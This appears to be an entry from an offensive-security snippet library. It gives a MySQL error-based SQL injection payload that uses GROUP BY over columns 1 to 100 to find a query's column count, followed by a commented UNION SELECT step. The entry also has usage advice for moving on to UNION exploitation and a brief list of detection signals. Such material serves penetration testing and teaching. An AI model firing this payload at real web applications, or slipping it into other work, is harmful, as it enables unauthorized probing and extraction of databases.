---
id: 7599168a-032f-41b6-8a41-2f20705341d8
name: mysql-group-by-column-detection
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:34.261355+00:00'
updated_at: '2023-04-10T20:22:54.560050+00:00'
platforms:
  - Web
  - MySQL
tags:
  - sql-injection
  - error-based
  - column-detection
validated: true
---

# mysql-group-by-column-detection

## Code

```sql
1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

# Unknown column '4' in 'group statement'
# This error means query uses 3 column
#-1' UNION SELECT 1,2,3--+\tTrue
```

## Description

This snippet detects MySQL query columns using a GROUP BY injection, grouping by up to 100 columns until an error reveals the structure. Includes comments for error analysis and a UNION SELECT verification.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `$_INJECTION_POINT` | Insertion point in the query | q=1' |
| `$_MAX_COLUMNS` | Maximum columns to test (default 100) | 75 |

## Usage

Deploy in SQL injection testing against MySQL-backed apps. Analyze errors to find column count, then proceed to UNION exploitation. Useful when ORDER BY is filtered but GROUP BY is not.

## Detection

- Logs with GROUP BY in SQL errors.
- Intrusion detection signatures for grouped column injections.
- Unusual query patterns in database audit logs.

## Related

- [[procedures/MySQL-Column-Detection-via-Order-By-or-Group-By]]
- [[codes/mysql-group-by-column-detection]]
